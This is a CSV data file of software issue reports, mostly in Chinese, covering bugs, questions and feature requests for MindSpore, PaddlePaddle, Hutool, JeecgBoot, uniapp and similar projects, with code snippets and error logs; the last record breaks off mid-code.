title,text
zk数据源使用问题,"或许是我对zk不熟，仅仅这样配置就能监听到配置的变化？不用指定监听哪个zk node之类的？或者有关于zk更详细的使用例子吗？   <code>: zk方式：liteflow.rule-source=el_yml:127.0.0.1:2181,127.0.0.1:2182,127.0.0.1:2183"
代码生成器是不是不支持H2数据库,版本号：3.1.0 项目使用H2数据库，在操作时，无法查询到H2数据库表。 经调试，能进入到62行代码中，不过，这里的条件是查询不出来数据，H2数据库条件应该是，问一下，需要做什么配置才能查询到H2数据库表呢？谢谢~   <code>: 在线开发 &gt; Online表单开发 &gt; 导入数据库表 jdbc:h2:tcp://127.0.0.1:9092/jeecg-boot;MODE=MySQL MODE=MySQL table_schema table_catalog
[CT][MS][Lusolve]GPU性能偶现不达标,"交付件性能用例GPU性能偶现不达标 / 硬件环境: GPU : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph def test_p_lusolve_10w_performance(): x = np.random.randn(100, 10, 10).astype(np.float32) a = torch.rand(100, 10, 10) data, pivots = torch.lu(a) lu_data = np.asarray(data, np.float32) lu_pivots = np.asarray(pivots, np.int32) fact = LuSolveMock(inputs=[Tensor(x), Tensor(lu_data), Tensor(lu_pivots)]) fact.forward_profile_cmp() run testcase testcase pass   <code>: ![faile](https://foruda.gitee.com/images/1667826113682145932/cc5f94da_10814128.png ""屏幕截图"")"
laytpl的模板中有tr，td标签时laytpl会报错,"在页面中定义的模板，渲染时会报错： Laytpl Error：ReferenceError: item is not defined 将tr td全部换成div就不会报错   <code>: &lt;script type=""text/html"" id=""table-tpl""&gt; {{# layui.each(d, function(index, item){ }} &lt;tr id=""item_{{item.id}}"" class=""tr-item""&gt; &lt;td class=""text-center""&gt; &lt;input type=""hidden"" value=""0""/&gt; &lt;input type=""checkbox"" lay-skin=""primary"" value=""{{item.id}}"" lay-filter=""check""/&gt; &lt;/td&gt; {{# if(item.model==1){ }} &lt;td class=""text-center""&gt;&lt;span class=""text-green""&gt;增项&lt;/span&gt;&lt;/td&gt; {{# }else{ }} &lt;td class=""text-center""&gt;&lt;span class=""text-red""&gt;减项&lt;/span&gt;&lt;/td&gt; {{# } }} &lt;td&gt;{{item.name}}&lt;/td&gt; &lt;td&gt;&lt;input type=""text"" class=""layui-input"" value=""{{item.amt}}"" placeholder=""{{item.name}}""/&gt;&lt;/td&gt; &lt;td&gt;{{item.memo}}&lt;/td&gt; &lt;/tr&gt; {{# }); }} &lt;/script&gt;"
[BUG][MD]The pyfunc process is suspended due to an error.,": /device gpu /device cpu : -- MindSpore version :20210616 master -- Python version : -- OS platform and distribution : -- GCC/Compiler version : pytest -s test_func_usability_issues.py::test_func_usability_issues_01 用例执行中卡死不退出 用例执行中异常正常抛出错误   <code>: def pass_func(_): for i in range(10): yield (np.array([i]),) def test_func_manifest_dataset_01(): data = ds.ManifestDataset(dataset_file ) data = data.map(operations=pass_func, input_columns=[""image""], num_parallel_workers=1, python_multiprocessing=True) num_iter = 0 for _ in data.create_dict_iterator(output_numpy=True): num_iter += 1"
SoftmaxCrossEntropyWithLogits sparse为False情况下，高维度输入出错,": GPU 让我对输入logits是否能取更高维度产生了怀疑。。   <code>: loss = nn.SoftmaxCrossEntropyWithLogits(sparse=False, reduction=""mean"") # logits shape (2, 5), labels shape(2, 5) logits = Tensor([[2, 4, 1, 4, 5], [2, 1, 2, 4, 3]], mindspore.float32) labels = Tensor([[0, 0, 0, 0, 1], [0, 0, 0, 1, 0]], mindspore.float32) output = loss(logits, labels) print(output) print(output.shape) # logits shape (1, 2, 5), labels shape(1, 2, 5) logits = Tensor([[[2, 4, 1, 4, 5], [2, 1, 2, 4, 3]]], mindspore.float32) labels = Tensor([[[0, 0, 0, 0, 1], [0, 0, 0, 1, 0]]], mindspore.float32) output = loss(logits, labels) print(output) print(output.shape) import tensorflow as tf print(tf.__version__) # 2.6.0 loss = tf.keras.losses.CategoricalCrossentropy(from_logits=True) logits = tf.constant([[2, 4, 1, 4, 5], [2, 1, 2, 4, 3]], dtype=tf.float32) labels = tf.constant([[0, 0, 0, 0, 1], [0, 0, 0, 1, 0]], dtype=tf.float32) output = loss(labels, logits) print(output) logits = tf.constant([[[2, 4, 1, 4, 5], [2, 1, 2, 4, 3]]], dtype=tf.float32) labels = tf.constant([[[0, 0, 0, 0, 1], [0, 0, 0, 1, 0]]], dtype=tf.float32) output = loss(labels, logits) print(output)"
"2个建议: 支持查看自己点过的""支持""和""反对""并可以取消，点评那用户名太长会导致换行",https://gitee.com/Discuz/DiscuzX/blob/master/upload/template/default/forum/viewthread_node.htm#L412 有个列表列出自己和的回复，并且能取消操作避免误点 而且点反对的会被显示到推荐？？ 回复的点评列表，如果名字太长，比如15个英文就会造成换行   <code>: 支持 反对
1.6.7的版本还没解决@Drill里的link不用主键关联的问题,"JDK版本： openjdk_8_201 erupt版本： 1.X.X   <code>: @Erupt(name=""xxx"") public class Test{ }"
是否能够增加IPUtil以方便获取服务所在服务器的IP,"使用的JDK版本和Hutool版本 JDK8、hutool 5.0.6 大佬好，在日常开放中，不免会用到异常推送，比如项目报错，直接推一条消息到邮件或终端、监控系统等，此时如果单单只推一条消息，若服务部署在多台服务器时，将无法准确得知这个错误是来自哪台服务器的，此时就可以尝试获取服务器的IP，追加到推送消息中，我们收到时就可以准确的得知是哪台服务i去报错了，工作中自己在网上找了一个实现的方法，是否可以融合在hutool未来的版本中，以方便大家，若方法有何不足或有更好的实现，欢迎作者大大修改或有更好的实现。 代码如下   <code>: /** * 获取服务器地址 * * @return Ip地址 */ public static String getServerIp() { // 获取操作系统类型 String sysType = System.getProperties().getProperty(""os.name""); String ip; if (sysType.toLowerCase().startsWith(""win"")) { // 如果是Windows系统，获取本地IP地址 String localIP = null; try { localIP = InetAddress.getLocalHost().getHostAddress(); } catch (UnknownHostException e) { LOG.error(e.getMessage(), e); } if (localIP != null) { return localIP; } } else { ip = getIpByEthNum(""eth0""); // 兼容Linux if (ip != null) { return ip; } } return ""获取服务器IP错误""; } /** * 根据网络接口获取IP地址 * @param ethNum 网络接口名，Linux下是eth0 * @return */ @SuppressWarnings(""rawtypes"") private static String getIpByEthNum(String ethNum) { try { Enumeration allNetInterfaces = NetworkInterface.getNetworkInterfaces(); InetAddress ip; while (allNetInterfaces.hasMoreElements()) { NetworkInterface netInterface = (NetworkInterface) allNetInterfaces.nextElement(); if (ethNum.equals(netInterface.getName())) { Enumeration addresses = netInterface.getInetAddresses(); while (addresses.hasMoreElements()) { ip = (InetAddress) addresses.nextElement(); if (ip != null &amp;&amp; ip instanceof Inet4Address) { return ip.getHostAddress(); } } } } } catch (SocketException e) { LOG.error(e.getMessage(), e); } return ""获取服务器IP错误""; }"
form:fileupload 如何设置非自动上传？,"WebUploader官网可以通过auto设置false，限制自动上传，但由于被重新封装过，这块想问下是否支持 ** **   <code>: // 初始化Web Uploader var uploader = WebUploader.create({ // 选完文件后，是否自动上传。 auto: true,"
unsqueeze op 不支持int32类型,"异常信息如下：   <code>: #-*- coding: utf-8 -*- from paddle import fluid import numpy as np inputs = fluid.layers.data(name='inputs',shape=[], dtype='int32') outputs = fluid.layers.unsqueeze(inputs, axes=0) place = fluid.CPUPlace() exe = fluid.Executor(place=place) exe.run(fluid.default_startup_program()) outputs_np = exe.run(feed={'inputs': np.array([1], dtype='int32')}, fetch_list=[outputs])[0] print(outputs_np) Traceback (most recent call last): File ""test_for_unsqueeze.py"", line 7, in &lt;module&gt; outputs = fluid.layers.unsqueeze(inputs, axes=0) File ""/home/zhoubo01/tools/miniconda2/envs/opensim-rl/lib/python3.6/site-packages/paddle/fluid/layers/nn.py"", line 5221, in unsqueeze ""XShape"": x_shape}) File ""/home/zhoubo01/tools/miniconda2/envs/opensim-rl/lib/python3.6/site-packages/paddle/fluid/layer_helper.py"", line 50, in append_op return self.main_program.current_block().append_op(*args, **kwargs) File ""/home/zhoubo01/tools/miniconda2/envs/opensim-rl/lib/python3.6/site-packages/paddle/fluid/framework.py"", line 1207, in append_op op = Operator(block=self, desc=op_desc, *args, **kwargs) File ""/home/zhoubo01/tools/miniconda2/envs/opensim-rl/lib/python3.6/site-packages/paddle/fluid/framework.py"", line 653, in __init__ self.desc.check_attrs() paddle.fluid.core.EnforceNotMet: Cannot get attribute axes by type std::vector&lt;int, std::allocator&lt;int&gt; &gt;, its type is int at [/paddle/paddle/fluid/framework/attribute.h:42]"
dynamic_lstm 参数与lstm门对应关系,"对于lstm，我们现在我使用，用普通的lstm。公式应该是 这样层参数个数应该是2* (1 *4)个。lstm内部kernel的参数个数也应该是 1 * (1 *4)个。但 1、fc_0参数，blstm_0.w_0，blstm_0.b_0和 与W_f,W_i,W_c,W_o的对应关系是？ 2、gate_activation可以自定义吗？现在的文档里写必须是 [tanh ,identity ,relu ,sigmoid]中的一个？   <code>: shape = [2] gate_size = 1 data = fluid.layers.data(name='data', shape=shape, dtype='float32') input_forward_proj = fluid.layers.fc(name='fc_0',input=data, size=gate_size * 4, act=None, bias_attr=False) forward, state = fluid.layers.dynamic_lstm( name='blstm_0', input=input_forward_proj, size=gate_size * 4,use_peepholes=False,gate_activation='sigmoid') place = fluid.CPUPlace() feeder = fluid.DataFeeder(place=place,feed_list=[data]) exe = fluid.Executor(place) exe.run(fluid.default_startup_program()) results = exe.run(fluid.default_main_program(), feed={'data':lod_tensor}, fetch_list=['blstm_0.w_0'],return_numpy=False) print np.array(results[0]).shape use_peepholes=False fc_0"
模仿 system 新增了一个自定义的业务模块，将生成的代码放入其中，登陆查询数据出现报错,将生成的代码放入原来的模块system中，运行时一切正常，将它们移动到自己新建的模块exam中，打开列表时出现下面的问题：   <code>: Invalid bound statement (not found): com.ruoyi.exam.mapper.ExamQuestionMapper.selectExamQuestionList
uniapp BLE蓝牙监听收不到回传消息,"设置成功了。但是uni.onBLECharacteristicValueChange(function (characteristic) { console.log('characteristic value comed:', characteristic) }) 收不到回传消息   <code>: uni.notifyBLECharacteristicValueChange({ state: true, // 启用 notify 功能 // 这里的 deviceId 需要已经通过 createBLEConnection 与对应设备建立链接 deviceId:deviceId, // 这里的 serviceId 需要在 getBLEDeviceServices 接口中获取 serviceId:serviceId, // 这里的 characteristicId 需要在 getBLEDeviceCharacteristics 接口中获取 characteristicId:characteristicId, success(res) { console.log('========设置通知监听成功:' + res.errMsg); console.log(JSON.stringify(res)); }"
[CT][MS][ CI]BackPropagate] AbstractTuple size: AbstractTuple,": /device gpu /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : test_net_3d_ops_conv3dtranspose_bn3d_prelu test_net_3d_ops_conv3dtranspose_bn3d_relu pass   <code>: self = &lt;mindspore.common.api._PynativeExecutor object at 0xffff66a4a590&gt; grad = &lt;mindspore.ops.composite.base.GradOperation object at 0xffff3c0afa10&gt; obj = WithLossCell&lt; (_backbone): METrainNet&lt; (net): NestReLUNet&lt; (net): Conv3DTransposeBN3DNet&lt; (bn3d): ...), group=1, has_bias=Falseweight_init=normal, bias_init=zeros, format=NCHW&gt; &gt; (_loss_fn): BCEWithLogitsLoss&lt;&gt; &gt; weights = (Parameter (name=weight, shape=(10, 10, 2, 2, 2), dtype=Float32, requires_grad=True), Parameter (name=mul_w, shape=(32...=Float32, requires_grad=True), Parameter (name=conv2d.weight, shape=(10, 10, 2, 2), dtype=Float32, requires_grad=True)) args = (Tensor(shape=[32, 10, 64, 64], dtype=Float32, value= [[[[ 1.00000000e+00, 1.00000000e+00, 1.00000000e+00 ... 1.000...0, 0.00000000e+00 ... 0.00000000e+00, 0.00000000e+00, 0.00000000e+00]]), Tensor(shape=[], dtype=Float32, value= 1)) kwargs = {} def grad(self, grad, obj, weights, *args, **kwargs): &gt; self._executor.grad_net(grad, obj, weights, *args, *(kwargs.values())) E RuntimeError: mindspore/ccsrc/frontend/optimizer/ad/kpynative.cc:659 BackPropagate] AbstractTuple size: AbstractTuple(element[0]: AbstractTensor(shape: (32, 10, 64, 64, 64), element: AbstractScalar(Type: Float32, Value: AnyValue, Shape: NoShape), value_ptr: 0x261e49c0, value: AnyValue),element[1]: AbstractTensor(shape: (10, 10, 2, 2, 2), element: AbstractScalar(Type: Float32, Value: AnyValue, Shape: NoShape), value_ptr: 0x261e49c0, value: AnyValue),element[2]: AbstractTensor(shape: (32, 10, 65, 65, 65), element: AbstractScalar(Type: Float32, Value: AnyValue, Shape: NoShape), value_ptr: 0x261e49c0, value: AnyValue),) not match primal cnode input size: 1259.1259:[CNode]1264{[0]: ValueNode&lt;PrimitivePy&gt; Conv3DTranspose, [1]: [CNode]1263, [2]: weight} E E # In file /root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/ops/composite/multitype_ops/add_impl.py(271)"
服务端设置 直接读取参数配置表，增加统一统一工具,环境信息 pigx版本: 3.9.0 是否修改包名: 否 目前版本 一些默认值 是配置在 配置文件，重构成从 参数表获取的形式 提供统一工具类，支持跨服务获取， 支持缓存   <code>: common-data
Unused parameters in framework.layers.py,In https://github.com/PaddlePaddle/Paddle/blob/66d1c6ce1edad4ee8505347c6dfab5a733b45772/python/paddle/v2/framework/layers.py#L88-L89 the parameters and are not in use?   <code>: program init_program
[ST][MS][NET][ASR-dynamic][GPU 1p]GetDeviceAddress] The size of device address is zero,"ASR-dynamic网络在GPU环境训练报Conv2DBackpropInput算子错误 / 硬件环境: /device GPU : -- MindSpore version :r2.0 commit_id:3942f0a0 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:HiAI/HISI_C83/20221010 MindSpore 版本：编译时间202210191215492 r2.0 commit_id:3942f0a0 (/): /mode graph test_ms_asr_dynamic_an4_32_train_check_loss_gpu_1p_0001.py cd solution_test/cases/02network/09audio/asr/train pytest -s test_ms_asr_dynamic_an4_32_train_check_loss_gpu_1p_0001.py 网络训练成功 走给徐攀   <code>: 36.67% : 1.805202s : 36: opt.transforms.opt_a 0.08% : 0.003914s : 1: opt.transforms.opt_after_cconv 0.05% : 0.002637s : 2: opt.transforms.opt_b 0.25% : 0.012410s : 1: opt.transforms.opt_trans_graph [WARNING] MD(18219,7fa21dffb700,python):2022-10-20-00:56:56.489.202 [mindspore/ccsrc/minddata/dataset/engine/datasetops/source/generator_op.cc:195] operator()] Bad performance attention, it takes more than 25 seconds to generator.__next__ new row, which might cause `GetNext` timeout problem when sink_mode=True. You can increase the parameter num_parallel_workers in GeneratorDataset / optimize the efficiency of obtaining samples in the user-defined generator function. [WARNING] MD(18219,7fa206ffd700,python):2022-10-20-00:56:56.566.789 [mindspore/ccsrc/minddata/dataset/engine/datasetops/data_queue_op.cc:824] DetectPerBatchTime] Bad performance attention, it takes more than 25 seconds to fetch a batch of data from dataset pipeline, which might result `GetNext` timeout problem. You may test dataset processing performance(with creating dataset iterator) and optimize it. [CRITICAL] KERNEL(18219,7fa307fff700,python):2022-10-20-00:56:58.301.572 [mindspore/ccsrc/plugin/device/gpu/kernel/gpu_kernel.h:190] GetDeviceAddress] The size of device address is zero, address index: 0, op name is: Conv2DBackpropFilter [CRITICAL] KERNEL(18219,7fa34b369700,python):2022-10-20-00:56:58.302.125 [mindspore/ccsrc/plugin/device/gpu/kernel/gpu_kernel.h:190] GetDeviceAddress] The size of device address is zero, address index: 0, op name is: Conv2DBackpropInput free(): corrupted unsorted chunks"
【众智】【数据算子】CommonVoiceDataset,"1.1算子分析 CommonVoice 数据集加载与解析算子，使得用户在下载并解压 CommonVoice 数据集文件后，可以通过此 API 直接加载到训练/验证用的数据。 Common Voice 是 Mozilla 的开源项目，基于 MPL 协议发行，到目前为止已经诞生了几年时间，它允许志愿者们为语音识别软件的数据库做出贡献，而这个数据库属于公共领域，所有人都可以将这些数据用于语音合成和识别软件。 链接：CommonVoice官网 下载链接:下载链接 返回指向数据集对象的指针，支持三种 Sampler 传递方式。   <code>: class mindspore.dataset.CommonVoiceDataset( dataset_dir, usage='train', num_samples=None, num_parallel_workers=None, shuffle=None, sampler=None, num_shards=None, shard_id=None, cache=None inline std::shared_ptr CommonVoice( const std::string &amp;dataset_dir, const std::string &amp;usage = ""all"", const std::shared_ptr &amp;sampler = std::make_shard(), const std::shared_ptr &amp;cache = nullptr) inline std::shared_ptr CommonVoice( const std::string &amp;dataset_dir, const std::string &amp;usage, const std::reference_wrapper sampler, const std::shared_ptr &amp;cache = nullptr) inline std::shared_ptr CommonVoice( const std::string &amp;dataset_dir, const std::string &amp;usage, Sampler *sampler, const std::shared_ptr &amp;cache = nullptr)"
"[CT][MS][Probability][Normal] normal mean  and func mean both none ,but run pass",": /device ascend : -- MindSpore version : 0.6.0 -- Python version : 3.7.5 -- OS platform and distribution : -- GCC/Compiler version : 7.3.0 pytest -s test_normal.py::test_normal_mean_011   <code>: def test_normal_mean_011(): class Net(nn.Cell): def __init__(self, mean=None, sd=None, seed=0, dtype=dtype.float32, name='Normal'): super().__init__() self.normal = msd.Normal(mean=mean, sd=sd, seed=seed, dtype=dtype, name=name) def construct(self, sd_a): return self.normal.mean(sd=sd_a) sd_a = np.random.rand(3).astype(np.float32) with pytest.raises(ValueError): net = Net() net(Tensor(sd_a)) ________________________________________________________________________________ test_normal_mean_011 ________________________________________________________________________________ @Author(""zwx5320437"") @Level2 def test_normal_mean_011(): class Net(nn.Cell): def __init__(self, mean=None, sd=None, seed=0, dtype=dtype.float32, name='Normal'): super().__init__() self.normal = msd.Normal(mean=mean, sd=sd, seed=seed, dtype=dtype, name=name) def construct(self, sd_a): return self.normal.mean(sd=sd_a) sd_a = np.random.rand(3).astype(np.float32) with pytest.raises(ValueError): net = Net() &gt; net(Tensor(sd_a)) E Failed: DID NOT RAISE &lt;class 'ValueError'&gt; test_normal.py:446: Failed"
fluid need a Print operator just like TF,"When debugging, it is pain to fetch one variable and print in python. And in operator, it is hard to fetch a variable, much trick needs. I found operator in TF with well-defined interface, we can reference it. it is necessary when we discard python .   <code>: whileloop Print forloop"
"Error message: ""ValueError: The checkpoint file does not exist.""","mindspore-assistant /device gpu -- MindSpore version (1.3): -- Python version (python 3.7.5): -- OS platform and distribution (Windows10): -- GCC/Compiler version (7.3.0): I am trying to implement FastRCNN using Mindspore, I am using the code from the offciel gitee as a reference: 'https://gitee.com/mindspore/mindspore/tree/r1.3/model_zoo/official/cv/faster_rcnn' knowint that I am using Mindspore 1.3 and VOC dataset. When I run the train.py code the following error pop up: This is the line of code causing the error: And this is what I have in Config: Why I cant find the above file, do I have to creat the checkpoint file or I have to download from somewhere? Thank you in advance,,   <code>: Traceback (most recent call last): File ""C:/Users/Yaman/PycharmProjects/MindSpore_1.3/train_New.py"", line 114, in &lt;module&gt; param_dict = load_checkpoint(load_path) File ""C:\Users\Yaman\AppData\Local\Programs\Python\Python37\lib\site-packages\mindspore\train\serialization.py"", line 401, in load_checkpoint ckpt_file_name, filter_prefix = _check_checkpoint_param(ckpt_file_name, filter_prefix) File ""C:\Users\Yaman\AppData\Local\Programs\Python\Python37\lib\site-packages\mindspore\train\serialization.py"", line 478, in _check_checkpoint_param raise ValueError(""The checkpoint file does not exist."") ValueError: The checkpoint file does not exist. load_path = config.pre_trained if load_path != """": param_dict = load_checkpoint(load_path) pre_trained: ""/cache/train/fasterrcnn/faster_rcnn-12_7393.ckpt"""
"[MS][LITE][master] GPU+ml_intent_detect_hi_v2.tflite, inference fail.",": /device gpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version :   <code>: 测试版本：master，commi_id: bfaf780c9916655b872d06505632b59746a76b88（2021-08-02-10-12-33） 测试用例：ml_intent_detect_hi_v2.tflite, 将标杆数据以及ms模型推送到手机，进行推理验证精度 测试结果：预期模型推理结果精度对比成功，实际GPU_FP32,仅有P20手机推理失败，GPU_FP16，仅有P8和Honor6推理成功，其余手机推理均失败 08-04 14:31:48.022 26707 26707 E MS_LITE : [mindspore/lite/src/runtime/gpu/opencl/opencl_runtime.cc:502] BuildProgram] Program build log: &lt;source&gt;:18:12: error: call to 'clamp' is ambiguous 08-04 14:31:48.022 26707 26707 E MS_LITE : result = clamp(result, (FLT)(act_min), (FLT)(act_max)); 08-04 14:31:48.022 26707 26707 E MS_LITE : ^~~~~ 08-04 14:31:48.022 26707 26707 E MS_LITE : 08-04 14:31:48.022 26707 26707 E MS_LITE : note: candidate function 08-04 14:31:48.022 26707 26707 E MS_LITE : note: candidate function 08-04 14:31:48.022 26707 26707 E MS_LITE : error: Compiler frontend failed (error code 60) 08-04 14:31:48.022 26707 26707 E MS_LITE : [mindspore/lite/src/runtime/gpu/opencl/opencl_runtime.cc:504] BuildProgram] Build program failed: Build program failure 08-04 14:31:48.022 26707 26707 E MS_LITE : [mindspore/lite/src/runtime/gpu/opencl/opencl_runtime.cc:409] BuildKernel] Arithmetic build failed! 08-04 14:31:48.022 26707 26707 E MS_LITE : [mindspore/lite/src/runtime/kernel/opencl/opencl_subgraph.cc:331] Prepare] prepare node Add-9 failed 08-04 14:31:48.022 26707 26707 E MS_LITE : [mindspore/lite/src/lite_session.cc:598] PrepareKernels] Prepare kernel GpuSubGraph0 failed: -1 08-04 14:31:48.022 26707 26707 E MS_LITE : [mindspore/lite/src/lite_session.cc:510] CompileGraph] Prepare kernels failed: -1 08-04 14:31:48.022 26707 26707 E MS_LITE : [mindspore/lite/src/cxx_api/model/model_impl.cc:126] Build] Build model failed. 08-04 14:31:48.029 26707 26707 E MS_LITE : [mindspore/lite/src/cxx_api/model/model_impl.cc:252] GetInputs] Session is null."
Shall we need a cache API for every dataset module?,"背景： 在做book的Docker Image时需要提前将dataset的数据缓存起来，尝试过以下方法： 用API直接下载的方式，类似 缺点是每次增加一个dataset时，需要修改代码 反射moudle调用里面的test函数，类似: 但有存在函数名字不一致，或者需要参数等情况。 建议 考虑在每个module加一个的API来完成缓存的操作,这样缓存的操作会长成以下这样：   <code>: # Cache conll05 dataset.common.download(dataset.conll05.WORDDICT_URL, 'conll05st', \ dataset.conll05.WORDDICT_MD5) for name filter(lambda x: not x.startswith(""__""), dir(paddle.v2.dataset)): mod = importlib.import_module(""paddle.v2.dataset.%s""%name) for method in filter(lambda x: x.startswith(""test""), dir(mod)): getattr(mod, ""test"")() test cache_to_local() for name filter(lambda x: not x.startswith(""__""), dir(paddle.v2.dataset)): getattr(importlib.import_module(""paddle.v2.dataset.%s""%name), ""cache_to_local"")()"
Forest实例化的接口调用hashCode会出现StackOverflowError,Forest: 1.5.19 Backend: (okhttp或httpclient)/version 该问题是如何引起的？ 报错信息/完整请求日志（如果没有请求日志请把开关打开） 接口定义（必要时请提供）   <code>: api = Forest.config().client(ChaoXingApi.class); Console.log(api.hashCode());
求帮助: pojo继承父类，通过泛型传递到父类中，这时插入时如何插入泛型的值,"下面的代码是父类中的字段，子类继承自父类。然后ENTITY泛型是子类的类型，这样如何插入到数据库中? 实体中时parent，表中是parent_id   <code>: @TableField(""parent_id"") private ENTITY parent;"
【众智】【计算-GPU开发】Gcd,逐元素计算两个tensor的最大公约数。 算子原语 接口目录：mindspore/python/mindspore/ops/operations/math_ops.py x1 x2 y 对应底层算子 对应底层算子Gcd Classify Name Type TypeRange Required Doc AttrDefault INPUT x1 int32/int64 TRUE INPUT x2 int32/int64 TRUE OUTPUT y int32/int64 TRUE PyTorch1.8.1接口： torch.gcd https://pytorch.org/docs/1.8.1/generated/torch.gcd.html 3. 异常处理 4. 算子反向 无反向   <code>: class Gcd(Primitive):
【众智】【数据算子】GloVe,"RFC GloVe使用一个词的中心词向量和背景词向量之和作为该词的最终词向量。GloVe的核心思维，就是希望得到每一个单词的词向量，并从中任意选取三个单词的词向量经过某种函数作用后，能够呈现出共现频率比值的这一规律性。由此可见，共现概率比值能比较直观地表达词之间的关系。GloVe试图用有关词向量的函数来表达共现概率比值。 GloVe是继承于Vectors算子的一种将预训练词向量加载到工作区的数据加载算子。当用户输入的词在预训练的词向量表中被找到时，会通过相应的方法以张量的形式返回该词对应的词向量。 GloVe继承于vector类,初始化函数继承Vectors类的初始化函数，继承 BuildFromFile函数可以将预训词向量加载到工作区，并可以通过继承的InferShape函数获取相应的数据文件的行数，维度等信息；glove同时具有Lookup函数，继承于Vectors类，可以通过输入的词查找相应的词向量，并且最终以张量的形式返回给用户。 to_vectors算子作为典型的数据增强算子，提供相应的接口层，ir层，op实现层， GloVe算子作为to_vectors的属性，实例化后供其使用。 1.2 数据集格式展示 数据集格式展示： GloVe读取的数据集如上图所示，每一行由token和token对应的词向量组成。如第一行中，token为 the，并选出词向量结果如下： 1.3 算子功能运行示例 Eg.举例用Glove算子进行加载 会返回结果，即数据集中的“the”后所跟的tensor 输出结果为： 会返回结果，即数据集中的“the”后所跟的tensor 2 接口描述 2.1 Python层接口描述 1.to_vectors算子 vectors Vectors Vectors算子实例化对象 unk_init sequence, optional 对未知词向量默认返回零向量，指定时使用该函数 lower_case_backup bool, optional 是否查找词的小写形式 2.GloVe算子 file_path str 词向量文件路径 max_vectors int, optional 最大读取词向量数 2.2 C++层接口描述 1.to_vectors算子 vectors std::shared_ptr vectors算子实例化对象 unk_init std::vector 对未知词向量默认返回零向量，指定时使用该函数 lower_case_backup bool 是否查找词的小写形式 2.GloVe算子 path Std::string 词向量文件路径 vectors std::shared_ptr * 实例化的vectors算子实例化对象 max_vectors int32_t 最大读取词向量数 2.3 算子设计规格 算子名称 ToVectors 算子参数 name：vectors type:std::shared_ptr name：unknown_init = {} type:std::vector name：lower_case_backup type:Bool 算子输入 name：input type:Tensor format:&lt;H,W&gt;or&lt;H,W,C&gt; 算子输出 name：output type:Tensor format:&lt;H,W&gt;or&lt;H,W,C&gt; 算子Op实现文件名称 to_vectors_op.hto_vectors_op.cc 算子Op名称 ToVectorsOp 中间表示层IR名称 ToVectorsOperation C++接口名称 ToVectors Python接口名称 ToVectors 算子名称 GloVe 算子参数 name：map type:const std::unordered_map&lt;std::string, std::vector&gt; name：dim type:int 算子输入 无 算子输出 无 算子Op实现文件名称 无 算子Op名称 无 中间表示层IR名称 无 C++接口名称 GloVe Python接口名称 GloVe   <code>: [0.418 0.24968 -0.41242 0.1217 0.34527 -0.044457 -0.49688 -0.17862 -0.00066023 -0.6566 0.27843 -0.14767 -0.55677 0.14658 -0.0095095 0.011658 0.10204 -0.12792 -0.8443 -0.12181 -0.016801 -0.33279 -0.1552 -0.23131 -0.19181 -1.8823 -0.76746 0.099051 -0.42125 -0.19526 4.0071 -0.18594 -0.52287 -0.31681 0.00059213 0.0074449 0.17778 -0.15897 0.012041 -0.054223 -0.29871 -0.15749 -0.34758 -0.045637 -0.44251 0.18785 0.0027849 -0.18411 -0.11514 -0.78581] import mindspore.dataset.text as text import mindspore.dataset.text.transforms as T DATA_PATH = ""../data/dataset/testGloVe"" vectors= text.GloVe.from_file(DATA_PATH + ""globe.6B.test.txt"", max_vectors=None) to_vectors = T.ToVectors(vectors) result = to_vectors(""the"") print(result) testRes_array = [0.418 0.24968 -0.41242 0.1217 0.34527 -0.044457 -0.49688 -0.17862 -0.00066023 -0.6566 0.27843 -0.14767 -0.55677 0.14658 -0.0095095 0.011658 0.10204 -0.12792 -0.8443 -0.12181 -0.016801 -0.33279 -0.1552 -0.23131 -0.19181 -1.8823 -0.76746 0.099051 -0.42125 -0.19526 4.0071 -0.18594 -0.52287 -0.31681 0.00059213 0.0074449 0.17778 -0.15897 0.012041 -0.054223 -0.29871 -0.15749 -0.34758 -0.045637 -0.44251 0.18785 0.0027849 -0.18411 -0.11514 -0.78581] class mindspore.dataset.text.transforms.ToVectors(vectors, unk_init=None, lower_case_backup=False) class mindspore.dataset.text.utils.GloVe.from_file(file_path, max_vectors) ToVectors::ToVectors(const std::shared_ptr&lt;Vectors&gt; &amp;vectors, const std::vector&lt;float&gt; unk_init, bool lower_case_backup) GloVe::BuildFromFile(const std::string &amp;path, int32_t max_vectors, std::shared_ptr&lt;GloVe&gt; *glove)"
动态创建数据源后，动态CURD问题,开发者您好 需求：我现在的项目里是有多租户的概念，需要在项目运行的过程中，动态创建数据源，进行租户的数据隔离及CRUD； 问题1：请问贵项目在动态创建数据源后，能否根据每次CRUD的租户不同，去调用不同的数据源？或者说能否根据一个bean名称/数据源名称之类的标记 指向不同数据源做CRUD操作？ 问题2：能否支持seata分布式事务？ 问题3：这部分功能是否需要单独付费？   <code>: 非常期待您的答复
[CT][MS][Trapz] The testcase of Trapz need modify.,"The testcase of Trapz need modify 用例测试覆盖不全，且添加相关用例时会报错： 输入x未使用随机值生成，且只测试了元组、列表的场景。int, float, bool, Tensor未测试，而且元组列表只测了一维的场景\ 输入dx的类型，设计文档写的是Tensor，代码中的说明是标量（标量应该只是int、float），测试用例支持的是int、float、列表、元组、bool。也没有用随机值生成 输入dim，只测了-1这一个值，也没用随机值 有的没有与标杆对比，添加对比后发现有精度问题 尝试添加部分用例，都出错了，应该是ops文件考虑不全，需要修改   <code>: def test_trapz_input_0d_dtype_fp64_error(): input_x1 = Tensor(np.random.randn(), dtype=mstype.float64) fact = TrapzMock(inputs=[input_x1, None, 1.0, -1]) fact.forward_cmp() def test_trapz_input_1d_dtype_fp32_error(): input_x1 = Tensor(np.random.randn(6), dtype=mstype.float32) fact = TrapzMock(inputs=[input_x1, None, 1.0, 1]) fact.forward_cmp() def test_trapz_input_5d_dtype_int64_error(): input_x1 = Tensor(np.random.randn(2, 3, 2, 3, 5), dtype=mstype.int64) fact = TrapzMock(inputs=[input_x1, None, 1.0, -1]) fact.forward_cmp() def test_trapz_input_6d_dtype_uint8_error(): input_x1 = Tensor(np.random.randn(2, 2, 1, 2, 3, 2), dtype=mstype.uint8) fact = TrapzMock(inputs=[input_x1, None, 1.0, 4]) fact.forward_cmp() def test_trapz_input_7d_dtype_uint32_error(): input_x1 = Tensor(np.random.randn(2, 2, 1, 2, 3, 8, 2), dtype=mstype.uint32) fact = 